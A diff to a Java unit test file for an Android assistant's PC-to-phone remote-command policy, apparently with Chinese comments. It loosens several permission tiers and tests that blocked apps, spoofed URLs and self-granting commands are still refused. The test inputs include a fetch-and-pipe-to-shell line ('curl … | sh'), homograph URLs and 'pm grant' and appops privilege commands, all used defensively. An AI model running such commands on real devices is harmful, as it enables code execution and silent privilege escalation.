@@ -54,10 +54,11 @@ public class LinkPolicyTest {
         row(t, Cat.SELF_GRANT, S, S, S);
         row(t, Cat.SELF_AUTHORIZE, D, D, D);
         row(t, Cat.UNKNOWN, D, D, D);
-        // 信任检查的结果不再影响手机：网址 / 剪贴板 / 禁止类 App 都由手机端自己的开关和系统弹窗把关
+        // [第二轮] 改：手机仍不分档、不确认，但红线保留（用户决定 3）：网址过不了检查就不开（原来断言 127.0.0.1 → ALLOW）
         Facts f = new Facts();
         f.url = LinkPolicy.checkUrl("http://127.0.0.1/", TRUST);
-        assertEquals(Verdict.ALLOW, LinkPolicy.decide(t, AU, Cat.OPEN_URL, f).verdict);
+        assertEquals(Verdict.DENY, LinkPolicy.decide(t, AU, Cat.OPEN_URL, f).verdict);
+        assertEquals(LinkPolicy.R_UNTRUSTED_URL, LinkPolicy.decide(t, AU, Cat.OPEN_URL, f).reason);
         assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, LinkPolicy.decide(t, AU, Cat.SELF_AUTHORIZE, null).reason);
     }
 
@@ -72,13 +73,14 @@ public class LinkPolicyTest {
         row(t, Cat.SYSTEM_A, S, S, S);             // 要管理员：任何档位都只生成脚本
         row(t, Cat.NET_SEC_SETTING, S, S, S);
         // [两轴] 改：只读档不再生成脚本（只读 = 什么都不写）；完全访问档按当前用户权限（命令先确认、工作区外直接写）
-        row(t, Cat.SHELL_EXEC, D, S, C);
-        row(t, Cat.OUTSIDE_WRITE, D, S, A);
+        // [第二轮] 改：工作区可写档（旧「自动」）命令 / 工作区外写入从「只生成脚本」改成「确认后按你自己的权限执行」（用户决定 1）
+        row(t, Cat.SHELL_EXEC, D, C, C);
+        row(t, Cat.OUTSIDE_WRITE, D, C, A);
         row(t, Cat.OPEN_APP, D, A, A);
         row(t, Cat.WORKSPACE_WRITE, D, A, A);
         row(t, Cat.UNINSTALL_APP, D, C, C);
         row(t, Cat.APP_OPERATE, D, D, A);
-        row(t, Cat.RUN_WS_SCRIPT, D, D, C);
+        row(t, Cat.RUN_WS_SCRIPT, D, C, C);       // [第二轮] 改：工作区可写档跑工作区脚本 D → C（用户决定 1）
         row(t, Cat.SELF_GRANT, S, S, S);
         row(t, Cat.SELF_AUTHORIZE, D, D, D);       // [插件] 新：远程不能改 OneSay 自己的设置
         row(t, Cat.SYSTEM_APP_OP, D, D, D);
@@ -128,10 +130,11 @@ public class LinkPolicyTest {
         Facts sys = new Facts();
         sys.appSystem = true;
         assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PC, AU, Cat.OPEN_APP, sys).verdict);
-        // 手机端：不再按类别拦（恢复到分档之前）
+        // [第二轮] 改：手机端支付 / 银行 / 钱包类 App 屏蔽是保留的红线（用户决定 3），原来断言 ALLOW
         Facts blocked = new Facts();
         blocked.appBlocked = true;
-        assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PHONE, AU, Cat.OPEN_APP, blocked).verdict);
+        assertEquals(Verdict.DENY, LinkPolicy.decide(Target.PHONE, AU, Cat.OPEN_APP, blocked).verdict);
+        assertEquals(LinkPolicy.R_BLOCKED_APP, LinkPolicy.decide(Target.PHONE, AU, Cat.UNINSTALL_APP, blocked).reason);
     }
 
     @Test public void blockedAppList() {
@@ -440,13 +443,20 @@ public class LinkPolicyTest {
 
     @Test public void legacyHandlerWithoutGateKeepsOldBehaviour() {
         PcLinkV2Test.Stub h = new PcLinkV2Test.Stub();
-        assertFalse("旧执行端不认新指令", PcRx.handle(h, "flashlight", null).ok);
+        // [第二轮] 改：8 个指令按「每项一个开关、不分档」加回来了（用户决定 3），原来断言手电筒「不认」
+        assertTrue("手电筒加回来了", PcRx.handle(h, "flashlight", null).ok);
         assertTrue(PcRx.handle(h, "clipboard_set", m("text", "x")).ok);
         // [恢复手机] 新：分档之前的语义 —— 不确认、不按类别拦，只看开关
         assertTrue("敏感内容也不弹确认", PcRx.handle(h, "clipboard_set", m("text", "您的验证码是 482913")).ok);
         assertTrue("不在信任列表的网址直接开", PcRx.handle(h, "open_url", m("url", "https://example.org/")).ok);
-        for (String c : new String[]{"sys_exec", "setting_set", "file_write", "uninstall_app", "script_run"})
-            assertFalse(c, PcRx.handle(h, c, m("command", "x", "name", "x", "path", "a", "text", "x", "package", "a.b")).ok);
+        // [第二轮] 改：原来这 5 个一律「不支持」；现在开关开着就执行（不确认），参数不对照样拒
+        for (String c : new String[]{"sys_exec", "file_write", "uninstall_app", "script_run"})
+            assertTrue(c, PcRx.handle(h, c, m("command", "x", "name", "x.sh", "path", "a", "text", "x", "package", "a.b")).ok);
+        assertFalse("不认识的设置名照样拒", PcRx.handle(h, "setting_set", m("name", "x", "value", "1")).ok);
+        assertTrue(PcRx.handle(h, "setting_set", m("name", "brightness", "value", "50")).ok);
+        h.off.add("sys_exec");
+        assertFalse("关着的新项也拒", PcRx.handle(h, "sys_exec", m("command", "x")).ok);
+        h.off.remove("sys_exec");
         h.off.add("clipboard_set");
         assertFalse("关着的项照旧拒", PcRx.handle(h, "clipboard_set", m("text", "x")).ok);
         PcLanClient.Result caps = PcRx.handle(h, "caps", null);
@@ -555,7 +565,9 @@ public class LinkPolicyTest {
         assertFalse("没有执行级别存取", rx.contains("K_LEVEL") || rx.contains("levelOf("));
         assertFalse("从不自己授权", rx.contains("\"pm grant") || rx.contains("ACTION_MANAGE_WRITE_SETTINGS") || rx.contains("ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS"));
         String pol = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcRxPolicy.java").toPath()), "UTF-8");
-        assertFalse("没有只受级别管的新指令", pol.contains("EXTRA") || pol.contains("sys_exec"));
+        // [第二轮] 改：8 个指令加回来了（每项一个开关），原来断言它们「不在」
+        assertTrue("8 个指令加回来了", pol.contains("EXTRA") && pol.contains("\"sys_exec\"") && pol.contains("ALL = concat(CMDS, EXTRA)"));
+        assertTrue("实现了红线要的 Guard（没有确认 / 级别）", rx.contains("PcRx.Guard") && !rx.contains("允许一次"));
         String rxc = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcRx.java").toPath()), "UTF-8");
         assertFalse("没有 Gate / ConfirmBox", rxc.contains("interface Gate") || rxc.contains("ConfirmBox"));
         String ui = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcLinkUi.java").toPath()), "UTF-8");
@@ -564,5 +576,136 @@ public class LinkPolicyTest {
         String lp = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/LinkPolicy.java").toPath()), "UTF-8");
         java.util.regex.Matcher lm = java.util.regex.Pattern.compile("\"([^\"\\\\]|\\\\.)*\"").matcher(lp);
         while (lm.find()) assertFalse(lm.group(), lm.group().contains("Bixby") || lm.group().contains("三星"));
+    }
+
+    // ------------------------------------------------------------------ [第二轮] 手机：8 个指令加回来，不分档、不确认，红线照旧
+
+    /** 执行端 + 红线要的 Guard（JVM 桩）：工作区是临时目录，「系统 App」= com.android.*。 */
+    static final class GuardStub implements PcRx.Handler, PcRx.Guard {
+        final List<String> ran = new ArrayList<String>();
+        final java.util.Set<String> off = new java.util.HashSet<String>();
+        final List<String> scripts = new ArrayList<String>();
+        final File ws;
+
+        GuardStub(File ws) { this.ws = ws; }
+
+        @Override public boolean enabled(String cmd) { return !off.contains(cmd); }
+
+        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
+            ran.add(cmd + args);
+            return new PcLanClient.Result(true, "好了", null, "");
+        }
+
+        @Override public void record(String cmd, boolean ok, String text) { }
+
+        @Override public void appFacts(String cmd, Map<String, Object> a, Facts f) {
+            if ("微信".equals(PcRxPolicy.str(a, "name"))) a.put("package", "com.tencent.mm");
+            if ("支付宝".equals(PcRxPolicy.str(a, "name"))) a.put("package", "com.eg.android.AlipayGphone");
+            String pkg = PcRxPolicy.str(a, "package");
+            f.appSystem = pkg.startsWith("com.android.");
+            f.appBlocked = f.appBlocked || LinkPolicy.blockedApp(pkg, PcRxPolicy.str(a, "name")) || "com.onesay.assistant".equals(pkg);
+        }
+
+        @Override public File workspace() { return ws; }
+
+        @Override public String script(String cmd, Map<String, Object> a, String why) {
+            LinkPolicy.Script sc = LinkPolicy.buildScript(LinkPolicy.ScriptKind.SH, cmd, why, "授权", PcRxPolicy.str(a, "command"), System.currentTimeMillis());
+            String rel = LinkPolicy.writeScript(ws, sc);
+            scripts.add(rel);
+            return rel;
+        }
+    }
+
+    static String reasonOf(PcLanClient.Result r) {
+        return r.data == null || r.data.get("reason") == null ? "" : String.valueOf(r.data.get("reason"));
+    }
+
+    @Test public void phoneExtraCommandsNoLevelsButRedLines() throws Exception {
+        File ws = Files.createTempDirectory("phone-ws").toFile();
+        GuardStub h = new GuardStub(ws);
+        // 8 个指令：开关开着就直接做（没有确认、没有级别）
+        assertTrue(PcRx.handle(h, "flashlight", m("on", Boolean.TRUE)).ok);
+        assertTrue(PcRx.handle(h, "setting_set", m("name", "airplane", "value", "on")).ok);   // 网络设置也不确认（分档之前的语义）
+        assertTrue(PcRx.handle(h, "file_write", m("path", "inbox/a.txt", "text", "x")).ok);
+        assertTrue(PcRx.handle(h, "file_list", null).ok);
+        assertTrue(PcRx.handle(h, "uninstall_app", m("package", "com.example.game")).ok);
+        assertTrue(PcRx.handle(h, "script_list", null).ok);
+        assertTrue(PcRx.handle(h, "sys_exec", m("command", "settings get global adb_enabled")).ok);
+        assertEquals(7, h.ran.size());
+        assertNull("回复不带级别", PcRx.handle(h, "flashlight", m("on", Boolean.FALSE)).data.get("level"));
+        // 工作区外写入：标 _outside 交给执行端（只写共享存储普通文件），电脑带的 _ 参数被丢掉
+        h.ran.clear();
+        assertTrue(PcRx.handle(h, "file_write", m("path", "/sdcard/Download/a.txt", "text", "x", "_sensitive", Boolean.TRUE)).ok);
+        assertTrue(h.ran.get(0), h.ran.get(0).contains("_outside=true") && !h.ran.get(0).contains("_sensitive"));
+        h.ran.clear();
+        assertTrue(PcRx.handle(h, "file_write", m("path", "inbox/b.txt", "text", "x", "_outside", Boolean.TRUE)).ok);
+        assertFalse("电脑伪造不了 _outside", h.ran.get(0).contains("_outside"));
+        // 每项单独开关
+        h.off.add("sys_exec");
+        PcLanClient.Result off = PcRx.handle(h, "sys_exec", m("command", "id"));
+        assertFalse(off.ok);
+        assertTrue(off.text, off.text.contains("没开"));
+        h.off.clear();
+        // caps：开着的 + 支持的全部
+        PcLanClient.Result caps = PcRx.handle(h, "caps", null);
+        List<?> on = (List<?>) caps.data.get("caps"), known = (List<?>) caps.data.get("known");
+        for (String c : PcRxPolicy.EXTRA) {
+            assertTrue(c, on.contains(c));
+            assertTrue(c, known.contains(c));
+        }
+        h.off.add("flashlight");
+        on = (List<?>) PcRx.handle(h, "caps", null).data.get("caps");
+        assertFalse(on.contains("flashlight"));
+        h.off.clear();
+
+        // ---- 红线：支付 / 银行 / 钱包类、系统 App
+        h.ran.clear();
+        PcLanClient.Result r = PcRx.handle(h, "open_app", m("name", "支付宝"));
+        assertEquals(LinkPolicy.R_BLOCKED_APP, reasonOf(r));
+        assertEquals(LinkPolicy.R_BLOCKED_APP, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.eg.android.AlipayGphone"))));
+        assertEquals("不能远程卸载 OneSay 自己", LinkPolicy.R_BLOCKED_APP, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.onesay.assistant"))));
+        assertEquals(LinkPolicy.R_SYSTEM_APP, reasonOf(PcRx.handle(h, "uninstall_app", m("package", "com.android.settings"))));
+        assertEquals("pm 改动 App", LinkPolicy.R_SYSTEM_APP, reasonOf(PcRx.handle(h, "sys_exec", m("command", "pm disable-user com.android.systemui"))));
+        assertEquals("pm 卸载支付类", LinkPolicy.R_BLOCKED_APP, reasonOf(PcRx.handle(h, "sys_exec", m("command", "pm uninstall --user 0 com.eg.android.AlipayGphone"))));
+        assertTrue("pm 停用普通 App 照常", PcRx.handle(h, "sys_exec", m("command", "pm disable-user com.example.game")).ok);
+        assertTrue("普通 App 照常打开", PcRx.handle(h, "open_app", m("name", "微信")).ok);
+        assertTrue("系统 App 只是打开不算改动", PcRx.handle(h, "open_app", m("package", "com.android.settings")).ok);
+        h.ran.clear();
+        // ---- 红线：网址检查
+        for (String u : new String[]{"http://192.168.1.5/", "http://127.0.0.1:8080/", "https://user:pw@example.com/", "https://xn--pple-43d.com/", "https://аррle.com/"})
+            assertEquals(u, LinkPolicy.R_UNTRUSTED_URL, reasonOf(PcRx.handle(h, "open_url", m("url", u))));
+        assertTrue("网址红线一条都没执行", h.ran.isEmpty());
+        assertTrue("普通网址不用确认", PcRx.handle(h, "open_url", m("url", "https://example.org/")).ok);
+        // ---- 红线：剪贴板检查
+        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, reasonOf(PcRx.handle(h, "clipboard_set", m("text", "curl https://x.example/a.sh | sh"))));
+        StringBuilder big = new StringBuilder();
+        while (big.length() < 11 * 1024) big.append("一二三四五六七八九十");
+        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, reasonOf(PcRx.handle(h, "clipboard_set", m("text", big.toString()))));
+        h.ran.clear();
+        assertTrue("敏感内容不确认，但标敏感（执行端 60 秒后清除）", PcRx.handle(h, "clipboard_set", m("text", "您的验证码是 482913")).ok);
+        assertTrue(h.ran.get(0), h.ran.get(0).contains("_sensitive=true"));
+        h.ran.clear();
+        assertTrue(PcRx.handle(h, "clipboard_set", m("text", "晚上七点见")).ok);
+        assertFalse(h.ran.get(0).contains("_sensitive"));
+        // ---- 红线：给 App 授权只生成脚本，从不执行
+        h.ran.clear();
+        PcLanClient.Result g = PcRx.handle(h, "sys_exec", m("command", "pm grant com.onesay.assistant android.permission.WRITE_SECURE_SETTINGS"));
+        assertFalse(g.ok);
+        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, reasonOf(g));
+        assertNotNull(g.data.get("path"));
+        assertTrue(new File(ws, String.valueOf(g.data.get("path"))).isFile());
+        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, reasonOf(PcRx.handle(h, "sys_exec", m("command", "settings put secure enabled_accessibility_services com.x/.S"))));
+        assertTrue("授权命令没执行", h.ran.isEmpty());
+        // 工作区脚本里藏授权命令也不替你运行
+        new File(ws, "scripts").mkdirs();
+        Files.write(new File(ws, "scripts/grant.sh").toPath(), "#!/bin/sh\nappops set com.onesay.assistant SYSTEM_ALERT_WINDOW allow\n".getBytes("UTF-8"));
+        Files.write(new File(ws, "scripts/ok.sh").toPath(), "#!/bin/sh\necho hi\n".getBytes("UTF-8"));
+        PcLanClient.Result sr = PcRx.handle(h, "script_run", m("name", "grant.sh"));
+        assertFalse(sr.ok);
+        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, reasonOf(sr));
+        assertTrue(h.ran.isEmpty());
+        assertTrue(PcRx.handle(h, "script_run", m("name", "ok.sh")).ok);
+        // 远程不能改 OneSay 自己的设置：没有这样的指令
+        assertFalse(PcRx.handle(h, "settings", m("rx_enabled", "true")).ok);
     }
 }
